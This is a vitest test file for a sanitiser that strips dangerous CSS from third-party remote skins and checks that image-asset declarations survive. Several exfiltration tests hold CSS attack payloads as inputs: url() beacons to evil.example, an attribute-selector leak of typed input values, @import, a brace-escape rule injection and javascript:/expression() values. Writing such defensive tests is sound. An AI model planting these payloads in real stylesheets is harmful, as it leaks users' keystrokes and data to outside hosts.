// Sanitiser tests for remote skins. The threat model is in remote-skins.ts's
// header: third-party CSS that exfiltrates via a url() the browser fires when a
// selector matches. These cases are the attacks that motivated the allowlist,
// so each one names what it would leak if it survived.

import { describe, it, expect } from 'vitest'
import { sanitizeRemoteSkinCss } from '../remote-skins'

const OPTS = {
  catalogId: 'neon',
  allowedAssets: ['cork.webp'] as const,
  assetPathBase: '/_skin-assets/neon'
}

describe('sanitizeRemoteSkinCss — what survives', () => {
  it('keeps --pro-* declarations and rebuilds our own selector', () => {
    const { css } = sanitizeRemoteSkinCss(
      `.proRoot[data-skin='neon'] { --pro-bg: #0a0a12; --pro-accent: #ff00ff; }`,
      OPTS
    )
    expect(css).toContain('--pro-bg: #0a0a12;')
    expect(css).toContain('--pro-accent: #ff00ff;')
    expect(css).toContain(`.proRoot[data-skin='remote:neon']`)
  })

  it('rewrites a declared asset url() to the local path', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-card: url(cork.webp); }`, OPTS)
    expect(css).toContain(`url('/_skin-assets/neon/cork.webp')`)
    expect(css).not.toContain('cork.webp)')
  })

  it('takes the last value when a token repeats, matching the cascade', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-bg: #111; --pro-bg: #222; }`, OPTS)
    expect(css).toContain('--pro-bg: #222;')
    expect(css).not.toContain('#111')
  })
})

describe('sanitizeRemoteSkinCss — exfiltration attempts', () => {
  it('drops a url() to an origin the manifest never declared', () => {
    // Would beacon on every paint: "a MightyMouse phone is showing this skin".
    const { css, dropped } = sanitizeRemoteSkinCss(
      `x { --pro-bg: url(https://evil.example/beacon.png); }`,
      OPTS
    )
    expect(css).not.toContain('evil.example')
    expect(dropped.join(' ')).toContain('undeclared asset')
  })

  it('drops ordinary properties, so no selector-matched background can fire', () => {
    // The core attack: input[value^='a'] { background: url(...) } leaks text.
    const { css } = sanitizeRemoteSkinCss(
      `input[value^='a'] { background: url(https://evil.example/?c=a); }`,
      OPTS
    )
    expect(css).toBe('')
  })

  it('drops @import, which would pull an entire unvetted stylesheet', () => {
    const { css } = sanitizeRemoteSkinCss(
      `@import url(https://evil.example/x.css); x { --pro-bg: #fff; }`,
      OPTS
    )
    expect(css).not.toContain('evil.example')
    expect(css).not.toContain('@import')
    expect(css).toContain('--pro-bg: #fff;')
  })

  it('drops a value that tries to close its block and start a new rule', () => {
    // `}` escape: if re-emitted verbatim this would author an arbitrary rule.
    const { css } = sanitizeRemoteSkinCss(
      `x { --pro-bg: red } input { background: url(https://evil.example/) } y { --pro-ink: blue; }`,
      OPTS
    )
    expect(css).not.toContain('evil.example')
    expect(css).not.toContain('background')
  })

  it('ignores a comment hiding a brace, which would desync brace counting', () => {
    const { css } = sanitizeRemoteSkinCss(
      `x { /* } */ --pro-bg: #abc; }`,
      OPTS
    )
    expect(css).toContain('--pro-bg: #abc;')
  })

  it('drops javascript:, expression() and -moz-binding values', () => {
    for (const evil of [
      '--pro-bg: javascript:alert(1)',
      '--pro-bg: expression(alert(1))',
      '--pro-bg: -moz-binding: url(evil.xml)'
    ]) {
      const { css } = sanitizeRemoteSkinCss(`x { ${evil}; }`, OPTS)
      expect(css).toBe('')
    }
  })

  it('drops a non --pro-* custom property, so no base rule can be repointed', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --app-secret-url: url(cork.webp); }`, OPTS)
    expect(css).toBe('')
  })

  it('cannot inject into the selector via the catalog id', () => {
    // Belt-and-braces: ids are validated upstream, but prove the selector is
    // built from ours and never from author text.
    const { css } = sanitizeRemoteSkinCss(`x { --pro-bg: #fff; }`, {
      ...OPTS,
      catalogId: 'neon'
    })
    expect(css.startsWith(`.proRoot[data-skin='remote:neon'] {`)).toBe(true)
  })

  it('returns empty for css with nothing allowlisted, so install refuses it', () => {
    const { css } = sanitizeRemoteSkinCss(`body { background: red; } * { color: blue }`, OPTS)
    expect(css).toBe('')
  })

  // ── The bottom strip ──────────────────────────────────────────────────────
  // A remote skin can't write `html:has(...)` itself, so the sanitizer lifts
  // its card colour there. Without this the phone shows Pro's cream band under
  // a dark deck.

  it('lifts --pro-card to a strip rule on html, which a skin cannot write itself', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-card: #0d1122; }`, OPTS)
    expect(css).toContain(`html:has(.proRoot:not(.skinPreview)[data-skin='remote:neon']) {`)
    expect(css).toContain('--pro-strip: #0d1122;')
  })

  // A store card mounts a real .proRoot wearing the skin. Unscoped, four preview
  // cards repaint the whole page in whichever skin sorted last.
  it('excludes store previews from the strip rule', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-card: #0d1122; }`, OPTS)
    expect(css).not.toMatch(/html:has\(\.proRoot\[/)
  })

  it('prefers an explicit --pro-strip over --pro-card', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-card: #0d1122; --pro-strip: #000814; }`, OPTS)
    expect(css).toContain('--pro-strip: #000814;')
    expect(css).not.toContain('--pro-strip: #0d1122;')
  })

  it('emits no strip rule when the skin declares neither, rather than guessing', () => {
    const { css } = sanitizeRemoteSkinCss(`x { --pro-bg: #070912; }`, OPTS)
    expect(css).not.toContain('html:has(')
  })

  it('keeps the strip selector ours, and its value allowlisted', () => {
    // The strip rule is a SECOND place author-influenced text lands, so it gets
    // the same two guarantees as the first: our selector, vetted value.
    const { css } = sanitizeRemoteSkinCss(
      `x { --pro-card: url(https://evil.example/leak.png); }`,
      { ...OPTS, catalogId: 'neon' }
    )
    // Undeclared asset -> the declaration never survives, so nothing to lift.
    expect(css).toBe('')
  })
})

describe('installRemoteSkin — the asset budget', () => {
  // A real generated skin declares 11 region images (deck, pad, mic, 4 keys,
  // 3 icons, mark). The ceiling used to be 8 and truncated with .slice(), which
  // left the extras undeclared: the sanitiser then dropped --pro-pad-img,
  // --pro-key-tab-img and --pro-icon-switcher-img while install still returned
  // success, so the phone showed a skin with a blank trackpad and no cause
  // anywhere near it.
  const REGIONS = [
    'pad', 'deck', 'mic', 'key-esc', 'key-tab', 'key-enter',
    'key-keyboard', 'icon-prev', 'icon-switcher', 'icon-settings', 'mark'
  ]
  const assets = REGIONS.map((r) => `${r}.webp`)
  const css = `x {\n${REGIONS.map((r) => `  --pro-${r}-img: url(${r}.webp);`).join('\n')}\n}`

  it('carries all 11 region images of a real generated skin', () => {
    const { css: out, dropped } = sanitizeRemoteSkinCss(css, { ...OPTS, allowedAssets: assets })
    expect(out.match(/--pro-[a-z-]+-img:/g)).toHaveLength(REGIONS.length)
    expect(dropped.filter((d) => d.includes('undeclared asset'))).toEqual([])
  })

  it('drops declarations for assets beyond what the manifest declared', () => {
    // The shape truncation used to produce: art referenced, asset never fetched.
    const { css: out, dropped } = sanitizeRemoteSkinCss(css, {
      ...OPTS,
      allowedAssets: assets.slice(0, 8)
    })
    expect(out.match(/--pro-[a-z-]+-img:/g)).toHaveLength(8)
    // Which three are lost depends on the manifest's order, so assert the count
    // and that they failed for the right reason — not specific region names.
    expect(dropped.filter((d) => d.includes('undeclared asset'))).toHaveLength(REGIONS.length - 8)
  })
})
